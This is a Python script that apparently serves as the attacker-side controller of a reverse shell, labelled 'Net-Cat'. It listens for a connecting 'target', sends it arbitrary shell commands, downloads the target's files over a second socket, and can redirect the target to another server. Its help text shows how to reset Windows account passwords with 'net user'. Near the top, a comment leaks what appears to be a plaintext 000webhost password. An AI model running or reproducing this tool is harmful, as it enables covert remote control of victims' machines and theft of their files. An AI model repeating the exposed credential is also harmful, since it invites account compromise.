#!/usr/bin/python
#-*-coding:utf8;-*-
#qpy:console
import random
import socket
import tqdm
import time
import sys
import os

# password of 000webhost = (#yT8w5JFz^*K6ELf)AVK)

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def clear():
    os.system("clear")

clear()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

count = 0
host = ""
port = 55555
seve_to_file = False
default_fname = "save_out_put.txt"
default_dir = "~"

try:
    s.bind((host,port))

    print(GREEN+"[WAITING FOR THE CONNECTION...]"+END)
    s.listen(5)

    (conn,addr) = s.accept()
    clear()
    #print(YELLOW+"\t\t\t[TARGET ADDRS = "+END+GREEN+addr[0]+"]"+END)

except Exception as e:
    print(RED,"[!][!] ",e,END)
    exit()

except KeyboardInterrupt:
    clear()
    print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite...")
    try:
        input("[Peres_Enter_To_Exit...]"+END)
        clear()
        s.close()
        exit(0)
    except KeyboardInterrupt:
          print(YELLOW+"[-] stupid can't escape this reality"+END)
          s.close()
          exit()
          pass

help = YELLOW + """\n\t\t-------------- Help ------------------\n
    Commands\t\tUse\t\t\t\tExample"""+END+GREEN+"""
    l-host\t\tlocal-host <command>\t\tlocal-host ls
    download\t\tdownload <file name>\t\tdownload music.mp4
    server\t\tserver <IP:PORT>   \t\tserver 127.0.0.1:468
    target-ip\t\ttarget-ip             \t\tit shows the target ip
    output_save\t\toutput_save <True/False>\toutput_seve True or output_save False
    
    help\t\tit shows this help message
    
    if you on windows you can reset the password by typing as follows
    net user <user name> <new password> example: net user omer password123
    
    For more information type the name of the command
    """ + END

#print(help)

n_list = [default_dir]

def dir_now():
    b = ""
    if count != 0:
        if com[:2] == "cd":
            b = com[3:]
            if com[3:] != "..":
                n_list.append(b)
                return b
            else:
                return n_list[-1]
                n_list.remove(n_list[-1])
        else:
            return n_list[-1]
    else:
        return default_dir

def Help(com):

    if com == "l-host":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print(GREEN+"l-host      \t\tl-host <command> : Executing command on localhost or current hosting machine")
        print("\nExample : l-host ls or pwd any Linux command"+END)

    elif com == "download":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print(GREEN+"download\t\tsend <file name> : send file to the host")
        print("\nExample : download music.mp3 or download dir_name1/dir_name2/music.mp3"+END)
        
    elif com == "server":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print(GREEN+"server      \t\tserver <IP:PORT> ")
        print("\nExample : server 127.0.0.1:7382"+END)
        
    elif com[:9] == "target-ip":
        if com[10:] == "help":
            print(YELLOW+"\nCommands\t\tUse"+END)
            print(GREEN+"target-ip\t\ttarget_ip")
            print("\nExample:target_ip -->it print the ip address of the target"+END)
        
        else:
            print(GREEN+"[!] unknown command "+END+RED+com[10:]+END+GREEN+"for target_ip try help"+END)
    elif com == "output_save":
        print(YELLOW+"\nCommands\t\tUse"+END)
        print(GREEN+"output_save\t\toutput_save [True/False]")
        print("\nExample:toutput_seve True or output_save False"+END)
    
    else:
        print(help)

def LocalHost(com):
    print(YELLOW+"\n\n\n"+"-"*50+END)
    print(GREEN+"[.......BEGINNING EXECUTING COMMAND ON LOCALHOST.......]"+END)
    print(YELLOW, "-"*50,END, "\n")

    if com[:2] == "cd":
        try:
            os.chdir(com[3:])
        except Exception as e:
            print(e)

    elif com[:2] == "ls":
        com = ("ls --color" + com[3:])
        os.system(com)

    else:
        os.system(com)
    print(YELLOW+"\n"+"-"*50+END)
    print(GREEN+"[...................END OF EXECUTING...................]"+END)
    print(YELLOW,"-"*50,END, "\n\n\n")

def recive(c):
    mp = 131537871
    #os.system("clear")
    _s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    print(MAGENTA+"[+] START_DAWNLOADING..."+END)
    _port = port -1
    try:
        _s.bind((host,_port))
        _s.listen(5)
        (_conn,_addr) = _s.accept()
    except:
        pass
    file_size = float(_conn.recv(1024).decode("utf-8"))
    _size = (125.44*file_size)/mp
    print("file name: ",c,"file size: ",_size,"MB")
    with open("/sdcard/received/"+c,"wb") as file:
        #The time when the data start recving
        start_time = time.time()
        progress = tqdm.tqdm(unit="B", unit_scale=True, unit_divisor=1000,total=int(file_size))
        while True:
            data = _conn.recv(1024)
            if not(data):
                progress.update(1024)
                break
            progress.update(1024)
            file.write(data)
                
            #The time when the data stop recving
        end_time = time.time()
        print("\nFile send successfully in ", end_time - start_time)
        _conn.close()
        _s.close()

while True:
    

    try:
        com = input(BLUE+"●"+END+GREEN+"  "+END+YELLOW+"Net-Cat"+END+GREEN+"@ ["+END+MAGENTA+dir_now()+END+GREEN+"]"+END+BLUE+"> "+END+GREEN)
        """help me"""+END
        count = count + 1
        if com[:8]=="download":

            if len(com) == 8:
                Help(com)
            else:
                conn.send(str.encode(com))
                c = com[9:]
                recive(c)

        elif com[:6] == "l-host":

            if len(com) == 6:
                Help(com)

            else:
                com = com[7:]
                LocalHost(com)
        elif com[:9] == "target-ip":
            if len(com) == 9:
                print(YELLOW,"[+] [TARGET] target ip = {}".format(addr[0]),END )
            else:
                Help(com)
        elif com[:11] == "output_save":
            if len(com) == 11:
                Help(com)
            elif com[12:] == "True" or com[12:] == "true":
                seve_to_file = True
                new_fname = input("[+] Enter file name (Default : save_out_put.txt): ")
                if len(new_fname) != 0:
                    default_fname = new_fname
            elif com[12:] == "False" or com[12:] == "false":
                seve_to_file = False
        elif com == "help":
            Help(com)
            
        elif com[:6] == "server":
            if len(com) == 6:
                Help(com)
            else:
                if ":" in com:
                    conn.send(str.encode(com))
                else:
                    print(RED+"Invalid addres!!"+END)                                    

        else:
            
            if com == "" or com == (" " * len(com)):
                com = "echo '[!][!] cannot execute empty commands :p'"

            conn.send(str.encode(com))
            
            if com == "exit" or com == "quite":
                try:
                    input(RED+"[Peres_Enter_To_Exit...]"+END)
                    print(MAGENTA+"[EXITING... Good Bay...]"+END)
                    conn.send(str.encode(com))
                    break
                except KeyboardInterrupt:
                    print(YELLOW+"[-] stupid can't escape this reality"+END)
                    break
            m = str(conn.recv(999999999),"utf-8")
            print(m)
            if seve_to_file:
                with open(default_fname,"a") as f:
                    f.write("\n"+"-"*60)
                    f.write("\n\t\t"+"<----------"+com+"----------->\n")
                    f.write(m)

    except Exception as e:
        print(e)

    except KeyboardInterrupt:
        clear()
        print(RED+"[KEYBOAD INTERRUPT Ctrl + C] Waite..."+END)
        try:
            input(MAGENTA+"[Peres_Enter_To_Continuse...]"+END)
            clear()
            pass
        except  KeyboardInterrupt:
            print(YELLOW+"[-] stupid can't escape this reality"+END)
            pass

conn.close()
s.close()
